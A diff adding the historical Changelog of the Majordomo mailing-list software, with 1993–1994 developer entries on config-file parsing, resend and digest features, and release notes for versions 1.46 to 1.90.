+Wed Jan 26 01:24:35 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* Makefile: added deletion of *~ to clean target
+
+	* resend: reformatted comment and reordered test for subject_prefix
+
+Tue Jan 25 20:58:12 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo: logging for create list if successful added
+
+	* majordomo: fixed lack of log for successful writeconfig
+
+	* majordomo:
+	Added do_digest and ccreate list code (using external programs) to majordomo
+
+Mon Jan 24 19:45:41 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo.pl:
+	added local(diff) to is_member per patch from brent chapman
+
+Sat Jan 22 21:15:52 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* config_parse.pl:
+	Fixed spelling typo and rewrote doc string for mungedomain.
+
+	* resend, config_parse.pl:
+	The subject_prefix keyword is now expanded the same as header, footer,
+	fronter etc. Doc string has been changed to reflect this.
+
+	* majordomo.pl:
+	Changed the mechanism by which I got the name of the list. The local
+	parameter $clean_list is now used rather than $mail'clean_list which
+	doesn't exit.
+
+	* majordomo.pl:
+	Changed the order of the parameters to addr_match so that mungedomain
+	comparison worked properly. It looks for arg2 to be a changed version
+	of arg1.
+
+	* config_parse.pl, majordomo.cf:
+	Fixed default archive directory specification to include listname. I
+	also made it properly pass configuration checks.
+
+	* majordomo.pl, config_parse.pl:
+	Added code that applies the mungdomain logic to all of the private_
+	options.  I also changed the documentation to reflect that fact.
+
+	* config_parse.pl:
+	Changed top explanatory text for config file to make use of - sign
+	correctly explained.
+	
+	Fixed code that eliminates \001's in regexp_arrays.
+	
+	Fixed code that interprets - sign escapes in string_arrays.
+
+Fri Jan 21 02:11:13 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* config_parse.pl:
+	Fixed a bug where expansion tokens in the explanatory test were being
+	expanded out of existance.
+	
+	Added fix for an obscure bug dealing with directory specifcation and
+	$list having a .new at the end.
+	
+	Made some commentary more explanatory, and fixed a few errors.
+	
+	Added code to allow - signs to have three functions in a here document:
+	
+	    To embed a blank line in the here document, put a '-' as the first
+	      and ONLY character on the line.
+	    To preserve whitespace at the beginning of a line, put a - on the
+	      line before the whitespace to be preserved
+	    To put a literal '-' at the beginning of a line, double it.
+
+
+
+Fri Jan  7 09:01:01 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+	* RELEASE OF 1.62 CONFIG BETA 2
+
+Fri Jan  7 05:23:35 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo:
+	Added code that implements a simple line continuation character. Using
+	\ as the last non whitespace character on the line causes the
+	following line to be added to the current command string. One bug,
+	when the command is printed out, it is all printed on one line, and
+	not as the sender typed it.
+
+	* resend, config_parse.pl:
+	Added the ability to prepend a word to the subject line. Uses the
+	config file parameter subject_prefix. This is useful for those reading
+	mailing list mail using mailers that can sort messages by subject
+	only.
+
+Fri Dec 10 11:51:04 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+	* RELEASE OF 1.62 CONFIG BETA 1
+
+Thu Dec  9 06:54:30 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* regress.t04, regress.t03, regress.t02, regress.t01, regress.e04,
+        regress.e03,
+	regress.e02, regress.e01, regress.t05, regress, rcmp:
+	the started regression suite
+
+	* README.CONFIG: added coment about tailoring %known_values
+
+	* config_parse.pl:
+	cleaned up some documentaion, and cleaned the code a bit too.
+	No functional chnages
+
+	* README.CONFIG: first cut of readme file
+
+	* resend:
+	fixed tail recursion problem that stopped final line from being
+        \n terminated in message_fronter
+
+	* resend, majordomo, config_parse.pl:
+	Removed getconfig_password. If they can getthe config file, then they
+	can get the admin password. Not really smart.
+	
+	Added message_fronter option. This text is prepended to the message
+        body.
+	
+	Added a man page describing the config_opts interface somewhat to
+	config_opts.pl.
+
+Wed Dec  8 07:07:47 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* config_parse.pl: enhanced docs for headers and footers
+
+	* resend, config_parse.pl:
+	Changed blank line equivalence character to be a '-' standing alone on
+	the line. The inital . played havoc with sendmail, since sendmail
+	exited once it saw the ., and I didn't want to play around with
+	doubling the dot etc. Besides, that would have made updating the
+	config file by editing the one received via mail impossible.
+	
+	I also have expansion operating correctly now. The substitution is
+	being done in resend rather than in the config file code. Also, I
+	removed an optimization that prevented scanning for ^from lines unless
+	the -I option was used. Now that this optiminbzation is gone, $sender
+	processing works fine.
+
+	* Makefile: changes for development installation.
+
+	* majordomo, config_parse.pl:
+	Normalized all options names. _ is the seperator of choice. Added
+	message_footer and message_headers keywords. This also required that I
+	implement a blank line equivalence. A single period sitting alone on a
+	line creates a blank line in the output. This single period is
+	recreated by writeconfig.
+	
+	A hidden file is now equivelent to noadvertize = /.*/;
+	
+	Created the function substitute_values that replaces strings in text
+	context.
+	
+	Added get_config code for do_approve and do_passwd.
+	
+	Parens were added to the unlink command to have it do the right thing.
+
+	* majordomo.cf: changes for development path
+
+	* majordomo_version.pl: version id 1.62Dev development
+
+	* resend:
+	Added code to allow header and footer generation. The headers and
+	footers are ocuring in the message properly, but the range of textual
+	substitutions that I wanted isn't the best. The config code is called
+	and substitution is done before any of the headers from the message
+	are parsed. Thus things like sender, subject etc are not available to
+	me for substitution in the header and footer text.
+	
+	Solving this problem may require a rewrite of the logic of resend. I
+	don't relish the thought. Alternatively, I could try to find a way to
+	do delayed expansion of tokens. Actually this might work. I can expand
+	the template at the time I actually use the template. Hmm, I'll think
+	about it tonite.
+
+Thu Nov 25 07:09:16 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo:
+	The keyword subscribe_policy was being incorrectly checked for as
+	subscribe-policy, thus all closes/auto functions were broken. I have
+	changed the occurances of subscribe-policy to subscribe_policy to fix
+	the problem. I also need to reconsile all of the keywords so they use
+	either a - or an _. This mixed seperator stuff is for the birds.
+
+Wed Nov 24 00:00:32 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo_version.pl, majordomo.cf, Makefile:
+	Changes to allow a straight make in the /tools/majordomo-1.62_config
+	directory.  Makefile modified to set up following tree:
+	
+	 (root is W_BIN below)
+	    root -+--          -- actual majordomo scripts, libraries etc
+	          +-- wrappers -- executable wrappers and wrapper shellscript
+		   +-- Tools    -- tools like split archive and digest
+		   +-- bin      -- user level tools, approve, bounce etc
+		   +-- man      -- man pages
+	
+	This is the tree I will be working with. also added make
+	permissions-shared to minimize anount of code that was to be run as
+	root.
+	
+	Version changed to be 1.62C, and majordomo.cf changed to point to
+	correct homedir.
+
+Tue Nov 23 23:51:40 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* config_parse.pl:
+	Changed mk_default_config to use END as the delimiter for array value
+	specifications so that EOF doen't conflict with the use of EOF in
+	newconfig.
+
+	* bounce-remind: changed Bounces to bounces.
+
+Fri Nov 19 17:48:38 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo: fixed date stamp on info file
+
+Thu Nov 18 23:53:35 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* config_parse.pl:
+	Changed mk_default_config so that it is now a two stage process using
+	an intermediate file, rather than forking and postprocessing the input
+	using the child process. When forking, I was having all sorts of
+	problems with the parent's STDIN getting mixed into the child's STDIN
+	producing garbage. Now an intermedaite file (listname.config.out) is
+	used to hold the text. The text is then read in, and comment
+	characters, and a header is added when necessary. This is output
+	to listname.config, and the temporary file listname.config.out is
+        removed.
+
+	* Makefile: added existance tests for directories before creating them
+
+	* config_parse.pl: Added support for array and enumerated types.
+	
+	Arrays are specified using the
+	
+	name << EOZ
+	value1
+	value 2
+	EOZ
+	
+	syntax.
+	
+	Also enhanced the commentary code.
+	
+	Added debugging levels and options.
+	
+	Added hooks for allowing incremental specification of a config file.
+
+	* Makefile: added install shared and a couple of other targets.
+
+	* majordomo.cf: added safedirs for locations of archives
+
+	* majordomo:
+	Changed last of config_opt{} references to use ',' instaed of '.'.
+	
+	Added support for advertize/noadvertize being array's of regexps.
+	
+	Added file handle flushing for REPLY filehandle to try to get around
+	an intermix problem.
+	
+	Added subscribe policy as a token rather than open, closed, or auto
+	keys.
+	
+	Added writeconfig keyword and fucntion that writes the configuration
+	file out as it is held in the config_opts array.
+	
+	Converted cf_bool (old style) to cf_ck_bool.
+
+	* majordomo.pl:
+	Fixed bug with multiple index concatenation in %config_opts{} with
+	admin_passwd. Also added a patch from Brent that fixes a filehandle
+	bug that sometimes truncated the mailing list.
+
+Thu Nov 11 21:13:48 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* resend: updated to version 1.19 of resend
+
+Tue Nov  9 20:08:08 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* resend:
+	added administrivia check for subject 'request .* addition', also
+	changed option parse code cf_check() to cf_check_bool(), and multiple
+	indicies for $config_opts rather than concatenated string.
+
+Tue Nov  2 19:23:09 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* approve: 1.62 merger
+
+Fri Sep 10 04:14:08 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* regress.test, regress.out: moved regress tests to a subdirectory
+
+	* majordomo.cf, majordomo:
+	added code to put 40 characters of the request subject line into
+         the reply subject line
+
+	* majordomo:
+	fix for bug that prevents which from working for private lists
+
+Thu Sep  9 23:08:05 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* config_parse.pl:
+	Fully table driven. With a parse table, known keyword/default value
+	table, comment table, and subsystem table. A default value beginning
+	with #! is eval'ed so that custom values can be created.
+	
+	There is a new function to create the default config file.  The
+	function could be called at any point since it will preserve the data
+	values. However, it does totally rewrite the comments in the config
+	file.
+	
+	The private keyword was causing headaches with its positional nature.
+	It is no longer supported. The file <listname>.private is still
+	available however. Also the password fields are no longer allowed to
+	specify password files. Their values set the pass phrase or password.
+	Also, the password in <listname>.passwd is always recognized.
+	
+	The new_keyword function takes 5 args:
+	
+	  keyword, default value, parse function, subsystem [comments]
+	
+	The comments are optional.
+
+	* majordomo:
+	Added a select call to make the REPLY file handle flush immediately
+	when lists are called. This prevents multiple headers when the fork
+	call in mk_default_config occurs.
+	
+	Also changed x-private to private-x, and removed the private keyword.
+	
+	Also print reason for dying in eval of majordomo.cf.
+
+	* majordomo.cf:
+	added umask call to set proper protections on config file
+
+	* resend:
+	Changed code so that a null value for a config parameter is checked
+	for rather than a defined value. Added a call to the approve code so
+	that the approve, admin, and <listname>.passwd values are all accepted
+	for article approval.
+
+	* majordomo: added chdir to move back to  after index command
+
+	* majordomo.pl, majordomo, config_parse.pl:
+	Basic fully table driven config file, with interface
+
+Sun Sep  5 07:54:06 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo, config_parse.pl:
+	performance enhancements, passwd detainting secured,
+        and advertize/noadvertize operate against pure machine address now
+
+Fri Sep  3 19:52:25 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* resend, majordomo, config_parse.pl, approve:
+	patched approve to accept from stdin, fixed buglet with grab_word
+        in config_parse.pl, and added date_info to default template
+
+	* majordomo.pl, majordomo.cf, majordomo:
+	removed  in favor of config file, removed debugging comments
+
+	* resend, regress.test, majordomo.pl, majordomo.cf, majordomo, Makefile:
+	merge of config files and version 1.60
+
+	* resend, majordomo.pl, majordomo: merged localisms with 1.60
+
+	* resend, regress.test, majordomo.pl, majordomo.cf, majordomo,
+          config_parse.pl, Makefile:
+	implementation of configuration file, mungedomain, advertize/noadvertize
+
+	* sample.cf, resend.README, resend, majordomo.pl, majordomo, approve,
+          Changes,
+        majordomo_version.pl:
+	version 1.60 of majordomo: additonal helps for moderated lists,
+        and fix for verion id bug
+
+	* majordomo_version.pl: Initial revision
+
+	* Manifest:
+	version 1.60 of majordomo: additonal helps for moderated lists,
+        and fix for verion id bug
+
+Wed Sep  1 20:37:49 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* archive.pl: Contributed archive program
+
+	* wrapper.sh, resend, request-answer, regress.test, new-list, medit,
+          majordomo.pl,
+        majordomo.cf, majordomo, bounce-remind, archive, Makefile:
+	Added code that checked to make sure that majordomo.cf eval'led correctly.
+	Also added code to date the new info file.
+
+Changes since release 1.62
+==========================
+
+New in version 1.90 are:
+
+The changes in majordomo are:
+
+	All options to majordomo can be set remotely using a
+	        configuration file. This includes
+		setting the subscribe policy to open, closed or auto, and
+		stripping comments from addresses.
+
+	The ability to hide a list when a "lists" command is issued.
+
+	A 50 character description can be shown when using the "lists"
+		command.
+
+	The info file can be dated when it is installed. This is useful if the
+		info file is being served using a method besides majordomo
+		(e.g. finger, gopher, www).
+
+	The operations get, index, info, which, who can each be made
+		private individually. If they are private, access to
+		the command is restricted to people on the list.
+
+	Addresses of the form user@host.dom.ain can be made to compare
+		equivalent to user@dom.ain. This works for subscribe,
+		unsubscribe, and all private options.
+
+	The sender name (in the envelope address) can be set remotely
+		on a per list basis.
+
+        Command lines can be continued by using a \
+		at the end of the line.
+
+        Spaces can be preserved in command line arguments by
+               preceding the space with a \. Thus files with spaces
+	       in their names can be retrieved.
+		
+		
+        New commands to manipulate configuration files have been
+	added:
+	    config <list> <password>
+
+	          retrieve a self-documenting configuration file for
+	          the list <list>.  The <password> can be the password
+	          contained in the file <listname>.passwd or the
+	          admin_password in the configuration file.
+
+	          Think of it as the info command with a password. I
+	          cribbed enough code from info for it.
+
+	    newconfig <list> <password>
+            <config file>
+	    EOF
+
+	    	Validates and installs a new configuration file. The
+		config file is expected to be a complete config file
+		as returned by "config".  Incremental changing of the
+		config file is not yet supported.  As soon as the
+		config file is validated and installed its settings
+		are available for use. This is useful to remember if
+		you have multiple commands in your mail message since
+		they will be subject to the settings of the new config
+		file.  If there is an error in the config file
+		(incorrect value...), the config file will not be
+		accepted and the error message identifying the problem
+		line(s) will be returned to the sender. Buglet: only
+		the error lines are returned to the sender not the
+		entire config file.
+
+		(does this remind you of "newinfo"; it should, I
+		shamelessly stole the newinfo code to make it into
+		newconfig).
+
+           writeconfig <list> <password> 
+
+                Write a new config in standard form. All of the config
+		file documentation is optional. Only the keywords and
+		values are necessary. If a config file, stripped of
+		all comments is installed using newconfig, that is
+		what is returned by config.  Writeconfig forces a
+		rewrite of the config file with all comments and
+		default values in place. It is useful to use after an
+		upgrade of majordomo since it will add the new
+		keywords for people to change. It also updates the
+		documentation in the file if that has changed.
+
+	A new command to generate a digest has been added:
+
+	  mkdigest <digest list name> <password>
+
+	  This will force a digest for the specified list to be created.
+
+With resend
+
+	Most of resend's options can be controlled remotely using a 
+	configuration file including:
+		moderation status
+		approval password
+		enabling administrivia checks
+		debugging
+		setting the maximum size for a message (in bytes)
+		setting the message precedence
+		purging received lines
+		setting a reply-to header
+		setting the list of files that determines valid posting
+			 addresses
+		setting the sender envelope name
+		
+	A number of features have been added to resend that are also
+	able to be controlled remotely.
+
+		Arbitrary headers can be added to outgoing messages
+		Arbitrary text can be added before the body of an
+			  outgoing message.
+		Arbitrary text can be added at the end of the body of
+			  an outgoing message.
+
+		An arbitrary word can be prefixed to the subject line
+		   to allow easier scanning of list mail
+                	   
+
+With digest
+
+    Brent Chapman's digest program has been integrated with majordomo.
+    As with the rest of the programs, the config file can be used to
+    set all of its parameters including:
+
+	issue and volume numbers
+	digest name
+	the size when a digest is automatically created
+	the header and trailer for the digest
+	the reply-to address can be set
+	the sender name can be set
+
+   In addition to the above, the config file version allows arbitrary
+   headers to be added to the outgoing digest.
+
+
+
+Changes since release 1.60
+==========================
+
+Fixed a major bug in "majordomo" where a file wasn't properly being
+closed during an "unsubscribe" operation; this would cause (on some
+platforms, under some circumstances) multiple "unsubscribe" operations
+contained in a single message to Majordomo to fail silently.
+
+Added "Doc" directory, with documentation (well, more documentation
+than was there previously, anyway) for Majordomo.  Included in the
+directory is the original paper on Majordomo and a file of instructions
+and explanations about Majordomo for new list owners.
+
+Added "Doc/samples" directory of sample list configuration files; thanks
+to Vince Skahan <vince@atc.boeing.com>.
+
+Added "Doc/man" directory of online manual pages.  Added "majordomo.8"
+and "approve.1" as the first entries; thanks to Jim Duncan <jim@math.psu.edu>.
+
+Fixed a major bug in "approve" that was keeping it from working on standard
+input.
+
+Fixed a minor bug in "approve" that was causing an extra blank line to be
+added after each "approve" line generated.
+
+Changes since release 1.56
+==========================
+
+"resend" will now look for an "Approved:" line as the first line of the
+body, in addition to as a header.  This makes it easier for folks who
+can't insert headers with their mailer to generate "Approved:" lines.
+
+"approve" will now approve messages that have been bounced by "resend",
+in addition to "request for approval" messages generated by Majordomo.
+This means that you can now easily set up a moderated mailing list by
+specifying the "-A" and "-a <passwd>" arguments to "resend", which will
+cause "resend" to send messages without a valid "Approved:" line to
+the list owner, who can then use "approve" to OK the messages that they
+want to be posted.
+
+Added support for a "majordomo_version.pl" file, which now lists the
+official version number for a particular release of the Majordomo package.
+A "help" command will now return this number, reflecting the version number
+of the entire package, rather than the version number of the "majordomo"
+PERL file (which is what "help" returned before).
+
+Fixed minor bug where list names were not always being converted to
+lower case.  Thanks to Roger Klorese <rogerk@queernet.org>.
+
+Changes since release 1.54
+==========================
+
+Added "--" as the first line of responses generated by Majordomo.  This
+keeps bounces of Majordomo-generated messages from being reprocessed as
+input if some broken mailer bounces them back to Majordomo instead of
+Majordomo-Owner.
+
+Added check to ensure that an address really is subscribed to a list
+before attempting to process an "unsubscribe" request for that address.
+This should stop the generation of "approve unsubscribe" requests for
+addresses that aren't really on the list anyway.
+
+Added comments to "sample.cf" file to document all variables set there.
+
+Added "get" and "index" commands to access files related to a list.
+Courtesy of Alan Millar <amillar@bolis.sf-bay.org> and
+Paul Haas <paulh@hamjudo.mi.org>.
+
+Added "-I" (restrict incoming messages to list members) and "-r" (add a
+"Reply-To:" field) flags to "resend"; see "resend.README" for details.
+Courtesy of Jon Luini <jonl@hal.com>.
+
+Renamed "sendmail" subroutine in "resend" to "resend_sendmail", to avoid
+conflict with "sendmail" subroutine in "majordomo.pl" file.  This should
+put an end to the "Malformed command links" warnings from "resend".
+
+Added "-a" (set an "approval" password) and "-A" (require approval of
+all messages; i.e., make this a moderated mailing list) flags to "resend";
+see "resend.README" for details.
+
+Added a comment to "README" about running setuid to a sendmail "trusted"
+user.
+
+Added "W_MAJORDOMO_CF" environment variable support to "Makefile" and
+"wrapper.c", so that this can be hard-coded into "wrapper", rather than
+inheireted from the environment of "wrapper" (which is a security problem).
+
+Changed "request-answer" by expanding recording to include info about
+the "unsubscribe" command.
+
+Changes since release 1.46
+==========================
+
+Updated README file.
+
+Removed MH dependencies from "approve"; it now works on stdin or file
+names passed as arguments.
+
+Changed "approve" from using multiple ~/.passwd/* files to using a single
+file ~/.majordomo.  See the comments at the start of "approve" for more info.
+
+Changed "bounce" from using multiple ~/.passwd/* files to using a single
+file ~/.majordomo.  See the comments at the start of "bounce" for more info.
+
+Changes in 1.46
+===============
+NOTE WELL: existance of a "<list>.private" file used to mean the same thing
+as existance of a "<list>.closed" file.  "<list>.private" now means something
+different (see below).  If you've got lists that are currently ".private",
+you should make them ".closed" before you install this version of Majordomo.
+
+Filename changes (mostly to accomodate 14-character limits):
+    bounce-reminder		bounce-remind
+    majordomo.cf.sample		sample.cf
+    request-recording		request-answer
+    mailstuff.pl		majordomo.pl
+
+Code reorganization; moved must support functions to "majordomo.pl".
+
+Fixed log locking bug; log now locked before each write.
+
+Fixed truncation bug caused by indiscriminate "chop"; now only chops
+trailing newlines.
+
+Both "subscribe" and "unsubscribe" now check to see if a requesting
+address looks like a real name rather than an email address (i.e., if
+the user issued a LISTSERV-style "subscribe <list> <real name>" command,
+rather than a Majordomo-style "subscribe <list> [<addr>]" command).  If
+it doesn't look like an email address, it squawks to the user and punts
+the request.
+
+Majordomo now slightly more liberal in accepting list names; it will now
+take "<list>", "list@site", and "<list@site>" as synonyms for "list".
+
+Majordomo now recognizes any line beginning with a "-" as equivalent
+to an "end" command, so it won't process automatically-added signatures
+any more.
+
+All requests to a given list can now be automatically approved by creating
+a file "$listdir/<list>.auto".  The list owner still gets the standard
+"SUBSCRIBE" and "UNSUBSCRIBE" advisories.
+
+Responses to "info" requests now include a "last updated <date>" line
+at the end, telling when the "<list>.info" file was last updated.  If
+you want the date printed and labelled in a particular timezone (GMT,
+say), you need to set that timezone in your TZ environment variable;
+something like this in your majordomo.cf file works well:
+    $ENV{"TZ"} = "GMT";
+
+Which mailer to use, and what arguments to pass it, can now be configured
+in the .cf file.  You have to use a mailer that will accept the header along
+with the text of the message (such as sendmail).  To set your own mailer,
+set the "$mailer" variable in the .cf file to the string to use to invoke
+the mailer.  The default, if none is specified, is:
+    "/usr/lib/sendmail -f\$sender \$to"
+You can use "\$sender", "\$to", "\$from", and/or "\$subject" in your command.
+Make sure you use the "\", so that these variables will be expanded later,
+rather than when the .cf file is read.
+
+The "which" command now does a case-insensitive substring match, rather
+than an address match.  Any address which matches the argument to "which"
+is included in the output to "which".  I.e., "which brent" will now match
+"brent", "Brent@GreatCircle.COM", "Chapman@GreatCircle.COM (Brent Chapman)",
+etc.
+
+You can now tell Majordomo, on a per-list basis, to strip comments
+from addresses before writing them to the list file by creating a
+file "$listdir/<list>.strip".  For example, in both
+"Brent@GreatCircle.COM (Brent Chapman)" and
+"Brent Chapman <Brent@GreatCircle.COM>", "Brent Chapman" is a comment,
+and the address can be simplified to "brent@greatcircle.com".
+
+You can now tell Majordomo, on a per-list basis, that a list is "private"
+by creating a file "$listdir/<list>.private".  If such a file exists,
+then only members of the list can access the list with "who" and "which"
+commands. 
+
+$Header: /sources/cvsrepos/majordomo/Changelog,v 1.23 1997/08/27 15:56:13 cwilson Exp $
+
